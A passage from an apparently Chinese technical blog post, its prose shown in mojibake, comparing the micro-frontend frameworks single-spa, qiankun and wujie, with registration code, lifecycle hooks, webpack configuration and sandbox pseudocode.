å½“è·¯ç”±æ»¡è¶³æ¡ä»¶æ—¶ï¼ˆè¿”å›trueï¼‰ï¼Œæ¿€æ´»ï¼ˆæŒ‚è½½ï¼‰å­åº”ç”¨ activeWhen: location =\u0026gt; location.pathname.startsWith(\u0026#39;/app1\u0026#39;), // ä¼ é€’ç»™å­åº”ç”¨çš„å¯¹è±¡ customProps: {} }, { name: \u0026#39;app2\u0026#39;, app: loadApp(\u0026#39;http://localhost:8082\u0026#39;, \u0026#39;app2\u0026#39;), activeWhen: location =\u0026gt; location.pathname.startsWith(\u0026#39;/app2\u0026#39;), customProps: {} }, { // å­åº”ç”¨åç§° name: \u0026#39;app3\u0026#39;, // å­åº”ç”¨åŠ è½½å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªpromise app: loadApp(\u0026#39;http://localhost:3000\u0026#39;, \u0026#39;app3\u0026#39;), // å½“è·¯ç”±æ»¡è¶³æ¡ä»¶æ—¶ï¼ˆè¿”å›trueï¼‰ï¼Œæ¿€æ´»ï¼ˆæŒ‚è½½ï¼‰å­åº”ç”¨ activeWhen: location =\u0026gt; location.pathname.startsWith(\u0026#39;/app3\u0026#39;), // ä¼ é€’ç»™å­åº”ç”¨çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥é…ç½®å‘Šè¯‰reactå­åº”ç”¨è‡ªå·±çš„å®¹å™¨å…ƒç´ æ˜¯ä»€ä¹ˆï¼Œè¿™å—å„¿å’Œvueå­åº”ç”¨çš„é›†æˆä¸ä¸€æ ·ï¼Œå®˜ç½‘å¹¶æ²¡æœ‰è¯´è¿™éƒ¨åˆ†ï¼Œæˆ–è€…æˆ‘æ²¡æ‰¾åˆ°ï¼Œæ˜¯é€šè¿‡çœ‹single-spa-reactæºç çŸ¥é“çš„ customProps: { domElement: document.getElementById(\u0026#39;microApp\u0026#39;), // æ·»åŠ  name å±æ€§æ˜¯ä¸ºäº†å…¼å®¹è‡ªå·±å†™çš„lyn-single-spaï¼ŒåŸç”Ÿçš„ä¸éœ€è¦ï¼Œå½“ç„¶åŠ äº†ä¹Ÿä¸å½±å“ name: \u0026#39;app3\u0026#39; } } ] // æ³¨å†Œå­åº”ç”¨ for (let i = apps.length - 1; i \u0026gt;= 0; i--) { registerApplication(apps[i]) } new Vue({ router, mounted() { // å¯åŠ¨ start() }, render: h =\u0026gt; h(App) }).$mount(\u0026#39;#app\u0026#39;) ii.å­åº”ç”¨å¯¼å‡ºæ–‡ä»¶ å­åº”ç”¨éœ€è¦å®‰è£…single-spa-reactæˆ–è€…single-spa-vueï¼Œ å°†å­åº”ç”¨ä¼ é€’ç»™single-spa-reactï¼Œå¾—åˆ°å­åº”ç”¨è¿è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œ å­åº”ç”¨å°†ç”Ÿå‘½å‘¨æœŸå¯¼å‡ºåˆ°å…¨å±€ï¼Œ åœ¨ä¸»åº”ç”¨å¯ä»¥è·å–å­åº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•° import React from \u0026#39;react\u0026#39;; import ReactDOM from \u0026#39;react-dom\u0026#39;; import \u0026#39;./index.css\u0026#39; import { BrowserRouter, Link, Route } from \u0026#39;react-router-dom\u0026#39; import singleSpaReact from \u0026#39;single-spa-react\u0026#39; // å­åº”ç”¨ç‹¬ç«‹è¿è¡Œ if (!window.singleSpaNavigate) { ReactDOM.render(rootComponent(), document.getElementById(\u0026#39;root\u0026#39;)) } // ç”Ÿå‘½å‘¨æœŸa const reactLifecycles = singleSpaReact({ React, ReactDOM, rootComponent, errorBoundary(err, info, props) { return \u0026lt;div\u0026gt; This renders when a catastrophic error occurs \u0026lt;/div\u0026gt; } }) // è¿™é‡Œå’Œvueä¸ä¸€æ ·ï¼Œpropså¿…é¡»å‘ä¸‹ä¼ é€’ export const bootstrap = async props =\u0026gt; { console.log(\u0026#39;app3 bootstrap\u0026#39;); return reactLifecycles.bootstrap(props) } export const mount = async props =\u0026gt; { console.log(\u0026#39;app3 mount\u0026#39;); return reactLifecycles.mount(props); } export const unmount = async props =\u0026gt; { console.log(\u0026#39;app3 unmount\u0026#39;); return reactLifecycles.unmount(props) } // æ ¹ç»„ä»¶ function rootComponent() { return \u0026lt;React.StrictMode\u0026gt; \u0026lt;BrowserRouter\u0026gt; \u0026lt;div\u0026gt; \u0026lt;Link to=\u0026#34;/app3\u0026#34;\u0026gt;Home\u0026lt;/Link\u0026gt; | \u0026lt;Link to=\u0026#34;/app3/about\u0026#34;\u0026gt; About\u0026lt;/Link\u0026gt; \u0026lt;Route exact path=\u0026#34;/app3\u0026#34; component={Home} /\u0026gt; \u0026lt;Route exact path=\u0026#34;/app3/about\u0026#34; component={About} /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/BrowserRouter\u0026gt; \u0026lt;/React.StrictMode\u0026gt; } // home ç»„ä»¶ function Home() { return \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;app3 home page\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; } // about ç»„ä»¶ function About() { return \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;app3 about page\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; } iii.æ‰“åŒ…é…ç½® å°†å­åº”ç”¨å¯¼å‡ºæ¨¡å¼è®¾ç½®ä¸ºumd\nconst package = require(\u0026#39;./package.json\u0026#39;) module.exports = { // å‘Šè¯‰å­åº”ç”¨åœ¨è¿™ä¸ªåœ°å€åŠ è½½é™æ€èµ„æºï¼Œå¦åˆ™ä¼šå»åŸºåº§åº”ç”¨çš„åŸŸåä¸‹åŠ è½½ publicPath: \u0026#39;//localhost:8082\u0026#39;, // å¼€å‘æœåŠ¡å™¨ devServer: { port: 8082 }, configureWebpack: { // å¯¼å‡ºumdæ ¼å¼çš„åŒ…ï¼Œåœ¨å…¨å±€å¯¹è±¡ä¸ŠæŒ‚è½½å±æ€§package.nameï¼ŒåŸºåº§åº”ç”¨éœ€è¦é€šè¿‡è¿™ä¸ªå…¨å±€å¯¹è±¡è·å–ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚å­åº”ç”¨å¯¼å‡ºçš„ç”Ÿå‘½å‘¨æœŸå‡½æ•° output: { // libraryçš„å€¼åœ¨æ‰€æœ‰å­åº”ç”¨ä¸­éœ€è¦å”¯ä¸€ library: package.name, libraryTarget: \u0026#39;umd\u0026#39; } } } iv.é¢„è§ˆ å¯ä»¥çœ‹åˆ°å®ƒæ˜¯åŠ¨æ€åŠ è½½çš„å­åº”ç”¨çš„jsï¼Œå¹¶æ‰§è¡Œjsï¼Œå°†å†…å®¹æ¸²æŸ“åˆ°äº†ä¸»åº”ç”¨çš„ç›’å­å†…ã€‚\n3.æ¡†æ¶ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š\næ•æ·æ€§ - ç‹¬ç«‹å¼€å‘ã€ç‹¬ç«‹éƒ¨ç½²ï¼Œå¾®åº”ç”¨ä»“åº“ç‹¬ç«‹ï¼Œå‰åç«¯å¯ç‹¬ç«‹å¼€å‘ï¼Œéƒ¨ç½²å®Œæˆåä¸»æ¡†æ¶è‡ªåŠ¨å®ŒæˆåŒæ­¥æ›´æ–°ï¼› æŠ€æœ¯æ ˆæ— å…³ï¼Œä¸»æ¡†æ¶ä¸é™åˆ¶æ¥å…¥åº”ç”¨çš„æŠ€æœ¯æ ˆï¼Œå¾®åº”ç”¨å…·å¤‡å®Œå…¨è‡ªä¸»æƒï¼› å¢é‡å‡çº§ï¼Œåœ¨é¢å¯¹å„ç§å¤æ‚åœºæ™¯æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸å¾ˆéš¾å¯¹ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ç³»ç»Ÿåšå…¨é‡çš„æŠ€æœ¯æ ˆå‡çº§æˆ–é‡æ„ï¼Œè€Œå¾®å‰ç«¯æ˜¯ä¸€ç§éå¸¸å¥½çš„å®æ–½æ¸è¿›å¼é‡æ„çš„æ‰‹æ®µå’Œç­–ç•¥ ç¼ºç‚¹ï¼š\néœ€è¦è‡ªå·±å»åŠ è½½å­åº”ç”¨ ä¸æ”¯æŒJavascriptæ²™ç®±éš”ç¦»ï¼Œéœ€è¦è‡ªå·±å»ä½¿ç”¨single-spa-leaked-globalsä¹‹ç±»çš„åº“å»éš”ç¦» ä¸æ”¯æŒcsséš”ç¦»ï¼Œéœ€è¦è‡ªå·±ä½¿ç”¨single-spa-cssåº“æˆ–è€…postcssç­‰å»è§£å†³æ ·å¼å†²çªé—®é¢˜ æ— æ³•é¢„åŠ è½½ æ¡†æ¶2: qiankun é˜¿é‡Œçš„qiankunæ˜¯åŸºäºsingle-spaçš„å¾®å‰ç«¯å®ç°åº“ï¼Œå­µåŒ–è‡ªèš‚èšï¼Œèƒ½æ›´ç®€å•ã€æ— ç—›çš„æ„å»ºä¸€ä¸ªç”Ÿäº§å¯ç”¨å¾®å‰ç«¯æ¶æ„ç³»ç»Ÿã€‚ç›®å‰(2024å¹´4æœˆ) github star 15.4kã€‚\n1.å®ç°æ–¹æ¡ˆ single-spaæ˜¯åŸºäºjs-entryæ–¹æ¡ˆï¼Œè€Œqiankun æ˜¯åŸºäºhtml-entry åŠæ²™ç®±è®¾è®¡ï¼Œä½¿å¾—å¾®åº”ç”¨çš„æ¥å…¥ åƒä½¿ç”¨ iframe ä¸€æ ·ç®€å•ã€‚ ä¸»åº”ç”¨ç›‘å¬è·¯ç”±ï¼ŒåŠ è½½å¯¹åº”å­åº”ç”¨çš„htmlï¼ŒæŒ‚è½½åˆ°ä¸»åº”ç”¨çš„å…ƒç´ å†…ï¼Œç„¶åè§£æå­åº”ç”¨çš„htmlï¼Œä»ä¸­åˆ†æå‡ºcssã€jså†å»æ²™ç›’åŒ–ååŠ è½½æ‰§è¡Œï¼Œæœ€ç»ˆå°†å­åº”ç”¨çš„å†…å®¹æ¸²æŸ“å‡ºæ¥ã€‚ qiankunå®ç°æ ·å¼éš”ç¦»æœ‰ä¸¤ç§æ¨¡å¼å¯ä¾›å¼€å‘è€…é€‰æ‹©ï¼š strictStyleIsolationï¼š è¿™ç§æ¨¡å¼ä¸‹ qiankun ä¼šä¸ºæ¯ä¸ªå¾®åº”ç”¨çš„å®¹å™¨åŒ…è£¹ä¸Šä¸€ä¸ª shadow dom èŠ‚ç‚¹ï¼Œä»è€Œç¡®ä¿å¾®åº”ç”¨çš„æ ·å¼ä¸ä¼šå¯¹å…¨å±€é€ æˆå½±å“ã€‚ experimentalStyleIsolationï¼š å½“ experimentalStyleIsolation è¢«è®¾ç½®ä¸º true æ—¶ï¼Œqiankun ä¼šæ”¹å†™å­åº”ç”¨æ‰€æ·»åŠ çš„æ ·å¼ï¼Œä¼šä¸ºæ‰€æœ‰æ ·å¼è§„åˆ™å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„é€‰æ‹©å™¨è§„åˆ™ï¼Œæ¥é™å®šå…¶å½±å“èŒƒå›´ qiankunå®ç°jséš”ç¦»ï¼Œé‡‡ç”¨äº†ä¸¤ç§æ²™ç®±ï¼Œåˆ†åˆ«ä¸ºåŸºäºProxyå®ç°çš„æ²™ç®±å’Œå¿«ç…§æ²™ç®±ï¼Œå½“æµè§ˆå™¨ä¸æ”¯æŒProxyä¼šé™çº§ä¸ºå¿«ç…§æ²™ç®± Proxyæ²™ç®±æœºåˆ¶ï¼š\n// ä¼ªä»£ç  class ProxySandbox { constructor() { const rawWindow = window; const fakeWindow = {} const proxy = new Proxy(fakeWindow, { set(target, p, value) { target[p] = value; return true }, get(target, p) { return target[p] || rawWindow[p]; } }); this.proxy = proxy } } let sandbox1 = new ProxySandbox(); let sandbox2 = new ProxySandbox(); window.a = 1; // ä¼ªä»£ç  ((window) =\u0026gt; { window.a = \u0026#39;hello\u0026#39;; console.log(window.a) // hello })(sandbox1.proxy); ((window) =\u0026gt; { window.a = \u0026#39;world\u0026#39;; console.log(window.a) // world })(sandbox2.proxy); å¿«ç…§æ²™ç®±ï¼š\n// ä¼ªä»£ç  class SnapshotSandbox { constructor() { this.proxy = window; this.modifyPropsMap = {}; // ä¿®æ”¹äº†é‚£äº›å±æ€§ this.active(); // è°ƒç”¨activeä¿å­˜ä¸»åº”ç”¨windowå¿«ç…§ } /**1. åˆå§‹åŒ–æ—¶ï¼Œåœ¨å­åº”ç”¨å³å°†mountå‰ï¼Œå…ˆè°ƒç”¨activeï¼Œä¿å­˜å½“å‰ä¸»åº”ç”¨çš„windowå¿«ç…§*/ active() { this.windowSnapshot = {}; // windowå¯¹è±¡çš„å¿«ç…§ for (const prop in window) { if (window.hasOwnProperty(prop)) { // å°†windowä¸Šçš„å±æ€§è¿›è¡Œæ‹ç…§ this.windowSnapshot[prop] = window[prop]; } } Object.keys(this.modifyPropsMap).forEach(p =\u0026gt; { window[p] = this.modifyPropsMap[p]; }); } /** * å­åº”ç”¨å¸è½½æ—¶ï¼Œéå†å½“å‰å­åº”ç”¨çš„windowå±æ€§ï¼Œå’Œä¸»åº”ç”¨çš„windowå¿«ç…§åšå¯¹æ¯” * å¦‚æœä¸ä¸€è‡´ï¼Œåšä¸¤æ­¥æ“ä½œ * 1. ä¿å­˜ ä¸ä¸€è‡´çš„windowå±æ€§ï¼Œ * 2. è¿˜åŸwindow */ inactive() { for (const prop in window) { // diff å·®å¼‚ if (window.hasOwnProperty(prop)) { // å°†ä¸Šæ¬¡æ‹ç…§çš„ç»“æœå’Œæœ¬æ¬¡windowå±æ€§åšå¯¹æ¯” if (window[prop] !== this.windowSnapshot[prop]) { // ä¿å­˜ä¿®æ”¹åçš„ç»“æœ this.modifyPropsMap[prop] = window[prop]; // è¿˜åŸwindow window[prop] = this.windowSnapshot[prop]; } } } } } 2.qiankunå®æˆ˜ i.ä¸»åº”ç”¨å…¥å£æ–‡ä»¶ åˆå§‹åŒ–ä¸»åº”ç”¨ï¼Œå¹¶æ³¨å†Œå­åº”ç”¨ ä¸»åº”ç”¨å…¥å£æ–‡ä»¶åˆå§‹åŒ–åº”ç”¨ï¼Œæ³¨å†Œå­åº”ç”¨ï¼Œæ³¨å†Œå­åº”ç”¨æ—¶æ”¯æŒä¼ å…¥å­åº”ç”¨åˆ—è¡¨ï¼Œ æ³¨å†Œå­åº”ç”¨æ—¶éœ€è¦æŒ‡æ˜ä»¥ä¸‹å‡ ä¸ªä¸»è¦å‚æ•°ï¼š\nnameï¼š å¾®åº”ç”¨çš„åç§°ï¼Œå¾®åº”ç”¨ä¹‹é—´å¿…é¡»ç¡®ä¿å”¯ä¸€ entryï¼š å­åº”ç”¨çš„è®¿é—®é“¾æ¥ã€‚ä¸»åº”ç”¨ä¼šåŠ è½½æ•´ä¸ªé¡µé¢ï¼Œä¾‹å¦‚https://qiankun.umijs.org/guide/ containerï¼šéœ€è¦æŒ‚è½½å­åº”ç”¨çš„DOMå…ƒç´  loader: å­åº”ç”¨æœªåŠ è½½æ—¶çš„ç•Œé¢ï¼Œä¸€èˆ¬ä¸ºloading activeRuleï¼š è·¯ç”±åŒ¹é…è§„åˆ™ å¼€å¯å­åº”ç”¨start(options) options.prefetchæ­¤æ—¶å¯ä»¥é€‰æ‹©æ˜¯å¦é¢„åŠ è½½å­åº”ç”¨ã€‚ options.sandboxé»˜è®¤æƒ…å†µä¸‹çš„æ²™ç®±å¯ç¡®ä¿ã€å•å®ä¾‹åœºæ™¯å­åº”ç”¨ä¹‹é—´ã€‘çš„æ ·å¼éš”ç¦»ï¼Œä½†æ— æ³•ç¡®ä¿ä¸»åº”ç”¨å’Œå­åº”ç”¨ã€æˆ–è€…å¤šå®ä¾‹åœºæ™¯çš„å­åº”ç”¨æ ·å¼éš”ç¦»ã€‚qiankunæä¾›äº†å¦å¤–ä¸¤ç§æ–¹å¼çš„éš”ç¦»ï¼Œä¾›å¼€å‘è€…é€‰æ‹©ï¼š strictStyleIsolationï¼šå½“é…ç½®ä¸º{ strictStyleIsolation: true }æ—¶è¡¨ç¤ºå¼€å¯ä¸¥æ ¼çš„æ ·å¼éš”ç¦»æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ä¸‹qiankunä¼šä¸ºæ¯ä¸ªå¾®åº”ç”¨çš„å®¹å™¨åŒ…è£¹ä¸Šä¸€ä¸ªshadow domèŠ‚ç‚¹ï¼Œä»è€Œç¡®ä¿å¾®åº”ç”¨çš„æ ·å¼ä¸ä¼šå¯¹å…¨å±€é€ æˆå½±å“ experimentalStyleIsolationï¼šå½“{experimentalStyleIsolation: true}è¢«è®¾ç½®ï¼Œqiankunä¼šæ”¹å†™å­åº”ç”¨æ‰€æ·»åŠ çš„æ ·å¼ä¸ºæ‰€æœ‰æ ·å¼è§„åˆ™å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„é€‰æ‹©å™¨è§„åˆ™æ¥é™å®šå…¶å½±å“èŒƒå›´ import { registerMicroApps, start, initGlobalState } from \u0026#39;qiankun\u0026#39;; registerMicroApps([ { name: \u0026#39;react app\u0026#39;, // app name registered entry: \u0026#39;//localhost:7100\u0026#39;, container: \u0026#39;#yourContainer\u0026#39;, activeRule: \u0026#39;/yourActiveRule\u0026#39;, }, { name: \u0026#39;vue app\u0026#39;, entry: { scripts: [\u0026#39;//localhost:7100/main.js\u0026#39;] }, container: \u0026#39;#yourContainer2\u0026#39;, activeRule: \u0026#39;/yourActiveRule2\u0026#39;, }, ]); // é€šè®¯ const { onGlobalStateChange, setGlobalState } = initGlobalState({ user: \u0026#39;qiankun\u0026#39;, }); onGlobalStateChange((value, prev) =\u0026gt; console.log(\u0026#39;[onGlobalStateChange - master]:\u0026#39;, value, prev)); setGlobalState({ ignore: \u0026#39;master\u0026#39;, user: { name: \u0026#39;master\u0026#39;, }, }); /** * è®¾ç½®é»˜è®¤è¿›å…¥çš„å­åº”ç”¨ */ setDefaultMountApp(\u0026#39;/react16\u0026#39;); /** * å¯åŠ¨åº”ç”¨ */ start({ prefetch: true, // é¢„åŠ è½½å­åº”ç”¨ sandbox:{ strictStyleIsolation: true, // shadow domçš„æ–¹å¼å®ç°æ ·å¼éš”ç¦» // experimentalStyleIsolation: true, //æ·»åŠ ç‰¹æ®Šçš„é€‰æ‹©å™¨çš„æ–¹å¼å®ç°æ ·å¼éš”ç¦» } }); runAfterFirstMounted(() =\u0026gt; { console.log(\u0026#39;[MainApp] first app mounted\u0026#39;); }); ii.å­åº”ç”¨å¯¼å‡ºç”Ÿå‘½å‘¨æœŸé’©å­ å­åº”ç”¨éœ€åœ¨è‡ªå·±çš„å…¥å£ jså¯¼å‡ºbootstrapã€mountã€unmountä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­ï¼Œä»¥ä¾›ä¸»åº”ç”¨åœ¨é€‚å½“çš„æ—¶æœºè°ƒç”¨\nimport React from \u0026#39;react\u0026#39;; import ReactDOM from \u0026#39;react-dom\u0026#39;; import App from \u0026#39;./App\u0026#39;; import * as serviceWorker from \u0026#39;./serviceWorker\u0026#39;; function render(props) { const { container } = props; ReactDOM.render(\u0026lt;App /\u0026gt;, container ? container.querySelector(\u0026#39;#root\u0026#39;) : document.querySelector(\u0026#39;#root\u0026#39;)); } /** * å’Œä¸»åº”ç”¨é€šè®¯ */ function storeTest(props) { props.onGlobalStateChange((value, prev) =\u0026gt; console.log(`[onGlobalStateChange - ${props.name}]:`, value, prev), true); props.setGlobalState({ ignore: props.name, user: { name: props.name, }, }); } if (!window.__POWERED_BY_QIANKUN__) { render({}); } /** * bootstrap åªä¼šåœ¨å¾®åº”ç”¨åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨ä¸€æ¬¡ï¼Œä¸‹æ¬¡å¾®åº”ç”¨é‡æ–°è¿›å…¥æ—¶ä¼šç›´æ¥è°ƒç”¨ mount é’©å­ï¼Œä¸ä¼šå†é‡å¤è§¦å‘ bootstrapã€‚ * é€šå¸¸æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œåšä¸€äº›å…¨å±€å˜é‡çš„åˆå§‹åŒ–ï¼Œæ¯”å¦‚ä¸ä¼šåœ¨ unmount é˜¶æ®µè¢«é”€æ¯çš„åº”ç”¨çº§åˆ«çš„ç¼“å­˜ç­‰ã€‚ */ export async function bootstrap() { console.log(\u0026#39;[react16] react app bootstraped\u0026#39;); } /** * åº”ç”¨æ¯æ¬¡è¿›å…¥éƒ½ä¼šè°ƒç”¨ mount æ–¹æ³•ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨è¿™é‡Œè§¦å‘åº”ç”¨çš„æ¸²æŸ“æ–¹æ³• */ export async function mount(props) { console.log(\u0026#39;[react16] props from main framework\u0026#39;, props); storeTest(props); render(props); } /** * åº”ç”¨æ¯æ¬¡ åˆ‡å‡º/å¸è½½ ä¼šè°ƒç”¨çš„æ–¹æ³•ï¼Œé€šå¸¸åœ¨è¿™é‡Œæˆ‘ä»¬ä¼šå¸è½½å¾®åº”ç”¨çš„åº”ç”¨å®ä¾‹ */ export async function unmount(props) { const { container } = props; ReactDOM.unmountComponentAtNode(container ? container.querySelector(\u0026#39;#root\u0026#39;) : document.querySelector(\u0026#39;#root\u0026#39;)); } iii. é…ç½®æ‰“åŒ…å·¥å…· ä¸ºäº†è®©ä¸»åº”ç”¨èƒ½æ­£ç¡®è¯†åˆ«å¾®åº”ç”¨æš´éœ²å‡ºæ¥çš„ä¸€äº›å…¨å±€ä¿¡æ¯å’Œå¼€å‘ç¯å¢ƒä¸‹çš„è·¨åŸŸå…¼å®¹ï¼Œåœ¨å­åº”ç”¨ï¼ˆä»¥create-react-appå‡ºæ¥çš„reacté¡¹ç›®ä¸ºä¾‹ï¼‰å®‰è£…@rescripts/cliï¼Œå¹¶åœ¨å­åº”ç”¨ç›®å½•ä¸‹æ–°å»º.rescriptsrc.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š\nconst { name } = require(\u0026#39;./package\u0026#39;); module.exports = { webpack: (config) =\u0026gt; { config.output.library = `${name}-[name]`; config.output.libraryTarget = \u0026#39;umd\u0026#39;; // ä¸ºäº†èƒ½é€šè¿‡window[\u0026#39;app-name1\u0026#39;]æ‹¿åˆ°å­åº”ç”¨å£°æ˜çš„ç”Ÿå‘½å‘¨æœŸ // webpack 5 éœ€è¦æŠŠ jsonpFunction æ›¿æ¢æˆ chunkLoadingGlobal config.output.jsonpFunction = `webpackJsonp_${name}`; config.output.globalObject = \u0026#39;window\u0026#39;; return config; }, devServer: (_) =\u0026gt; { const config = _; config.headers = { \u0026#39;Access-Control-Allow-Origin\u0026#39;: \u0026#39;*\u0026#39;, }; config.historyApiFallback = true; config.hot = false; config.watchContentBase = false; config.liveReload = false; return config; }, }; iv.é¢„è§ˆ ä½¿ç”¨strictStyleIsolationï¼štrueæ–¹å¼è¿›è¡Œæ ·å¼éš”ç¦»ï¼Œä¼šç”Ÿæˆä¸€ä¸ªshadow domï¼Œè¿›è¡Œæ ·å¼çš„å®Œå…¨éš”ç¦»ï¼š\nä½¿ç”¨experimentalStyleIsolationï¼štrueçš„æ–¹å¼è¿›è¡Œæ ·å¼éš”ç¦»ï¼Œä¼šåœ¨cssé€‰æ‹©å™¨å‰æ·»åŠ ç‰¹æ®Šæ ‡è¯†ï¼š å¯ä»¥çœ‹åˆ°ï¼Œqiankunä¼šå°†å­åº”ç”¨çš„htmlæ¸²æŸ“åˆ°è‡ªå®šä¹‰çš„containerä¸­ã€‚ ä¸»åº”ç”¨åŠ è½½çš„æ˜¯å­åº”ç”¨çš„htmlï¼Œåœ¨è§£æå­åº”ç”¨çš„htmlçš„è¿‡ç¨‹ä¸­é‡åˆ°jså’Œcssä¼šè½½æ¡†æ¶å†…è¿›è¡Œæ²™ç›’å¤„ç†ï¼Œå®Œæˆcsså’Œjsçš„éš”ç¦»ï¼Œä¹‹åä¸‹è½½å¹¶æ‰§è¡Œï¼Œå®Œæˆæ•´ä¸ªå­åº”ç”¨çš„æ¸²æŸ“è¿‡ç¨‹ã€‚\n3.æ¡†æ¶ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹\nhtml entryçš„æ¥å…¥æ–¹å¼ï¼Œä¸éœ€è¦è‡ªå·±å†™loadæ–¹æ³•ï¼Œè€Œæ˜¯ç›´æ¥å†™å­åº”ç”¨çš„è®¿é—®é“¾æ¥å°±å¯ä»¥ã€‚ æä¾›jsæ²™ç®± æä¾›æ ·å¼éš”ç¦»ï¼Œä¸¤ç§æ–¹å¼å¯é€‰ èµ„æºé¢„åŠ è½½ï¼Œåœ¨æµè§ˆå™¨ç©ºé—²æ—¶é—´é¢„åŠ è½½æœªæ‰“å¼€çš„å¾®åº”ç”¨èµ„æºï¼ŒåŠ é€Ÿå¾®åº”ç”¨æ‰“å¼€é€Ÿåº¦ã€‚ ç¤¾åŒºæ´»è·ƒ umi æ’ä»¶ï¼Œæä¾›äº† @umijs/plugin-qiankun ä¾› umi åº”ç”¨ä¸€é”®åˆ‡æ¢æˆå¾®å‰ç«¯æ¶æ„ç³»ç»Ÿ é™¤äº†æœ€åä¸€ç‚¹æ‹“å±•ä»¥å¤–ï¼Œå¾®å‰ç«¯æƒ³è¦è¾¾åˆ°çš„æ•ˆæœéƒ½å·²ç»è¾¾åˆ°ã€‚ åº”ç”¨é—´é€šä¿¡ç®€å•ï¼Œå…¨å±€æ³¨å…¥è·¯ç”±ä¿æŒï¼Œæµè§ˆå™¨åˆ·æ–°ã€å‰è¿›ã€åé€€ï¼Œéƒ½å¯ä»¥ä½œç”¨åˆ°å­åº”ç”¨ è·¯ç”±ä¿æŒï¼Œæµè§ˆå™¨åˆ·æ–°ã€å‰è¿›ã€åé€€ï¼Œéƒ½å¯ä»¥ä½œç”¨åˆ°å­åº”ç”¨ ç¼ºç‚¹\næ”¹é€ æˆæœ¬è¾ƒå¤§ï¼Œä» webpackã€ä»£ç ã€è·¯ç”±ç­‰ç­‰éƒ½è¦åšä¸€ç³»åˆ—çš„é€‚é… å¯¹ eval çš„äº‰è®®ï¼Œevalå‡½æ•°çš„å®‰å…¨å’Œæ€§èƒ½æ˜¯æœ‰ä¸€äº›äº‰è®®çš„ï¼šMDNçš„evalä»‹ç»ï¼› æ— æ³•åŒæ—¶æ¿€æ´»å¤šä¸ªå­åº”ç”¨ï¼Œä¹Ÿä¸æ”¯æŒå­åº”ç”¨ä¿æ´» æ— æ³•æ”¯æŒ vite ç­‰ ESM è„šæœ¬è¿è¡Œ æ¡†æ¶3: wujie wujieæ˜¯è…¾è®¯å‡ºå“ã€‚åŸºäº webcomponent å®¹å™¨ + iframe æ²™ç®±ï¼Œèƒ½å¤Ÿå®Œå–„çš„è§£å†³é€‚é…æˆæœ¬ã€æ ·å¼éš”ç¦»ã€è¿è¡Œæ€§èƒ½ã€é¡µé¢ç™½å±ã€å­åº”ç”¨é€šä¿¡ã€å­åº”ç”¨ä¿æ´»ã€å¤šåº”ç”¨æ¿€æ´»ã€vite æ¡†æ¶æ”¯æŒã€åº”ç”¨å…±äº«ç­‰ã€‚ç›®å‰ï¼ˆ2024å¹´4æœˆï¼‰github star 3.7k\n1.å®ç°æ–¹æ¡ˆ æ— ç•Œåˆ©ç”¨iframeå’Œwebcomponentæ¥æ­å»ºå¤©ç„¶çš„jséš”ç¦»æ²™ç®±å’Œcsséš”ç¦»æ²™ç®±, åˆ©ç”¨iframeçš„historyå’Œä¸»åº”ç”¨çš„historyåœ¨åŒä¸€ä¸ªtop-level browsing contextæ¥æ­å»ºå¤©ç„¶çš„è·¯ç”±åŒæ­¥æœºåˆ¶ æ”¯æŒä»¥fiberçš„å½¢å¼æ‰§è¡Œjsï¼Œç”±äºå­åº”ç”¨çš„æ‰§è¡Œä¼šé˜»å¡ä¸»åº”ç”¨çš„æ¸²æŸ“çº¿ç¨‹ï¼Œå½“fiberè®¾ç½®ä¸ºtrueï¼Œé‚£ä¹ˆjsæ‰§è¡Œæ—¶é‡‡å–ç±»ä¼¼react fiberçš„æ¨¡å¼æ–¹å¼é—´æ–­æ‰§è¡Œï¼Œæ¯ä¸ª js æ–‡ä»¶çš„æ‰§è¡Œéƒ½åŒ…è£¹åœ¨requestidlecallbackä¸­ï¼Œæ¯æ‰§è¡Œä¸€ä¸ªjså¯ä»¥è¿”å›å“åº”å¤–éƒ¨çš„è¾“å…¥ï¼Œä½†æ˜¯è¿™ä¸ªé¢—ç²’åº¦æ˜¯jsæ–‡ä»¶ï¼Œå¦‚æœå­åº”ç”¨å•ä¸ªjsæ–‡ä»¶è¿‡å¤§ï¼Œå¯ä»¥é€šè¿‡æ‹†åŒ…çš„æ–¹å¼é™ä½è¾¾åˆ°fiberæ¨¡å¼æ•ˆç›Šæœ€å¤§åŒ– wujieæ˜¯å¦‚ä½•æ¸²æŸ“å­åº”ç”¨çš„ï¼Ÿ wujieè·Ÿqiankunä¸€æ ·ï¼Œéƒ½æ˜¯åŸºäºhtml entryåŠ è½½çš„ï¼Œä½†ä»–ä»¬è§£æhtmlçš„è¿‡ç¨‹æ˜¯ä¸ä¸€æ ·çš„ã€‚ qiankunæ˜¯ç›´æ¥è§£æå¹¶æ‰§è¡Œjsã€cssã€htmlçš„ï¼Œè€Œwujieåˆ™æ˜¯å…ˆè§£æhtmlï¼Œæå–å‡ºscriptè„šæœ¬æ”¾å…¥ç©ºçš„iframeä¸­ï¼Œæå–å‡ºcssã€htmlæ”¾å…¥åˆ°web componentsä¸­ï¼Œå…·ä½“æ¥è¯´ï¼š\nè§£æå…¥å£ HTML ï¼Œåˆ†åˆ«å¾—åˆ°scriptã€cssã€æ¨¡ç‰ˆhtml åˆ›å»ºä¸€ä¸ªçº¯å‡€çš„ iframeï¼Œä¸ºäº†å®ç°åº”ç”¨é—´ï¼ˆiframe 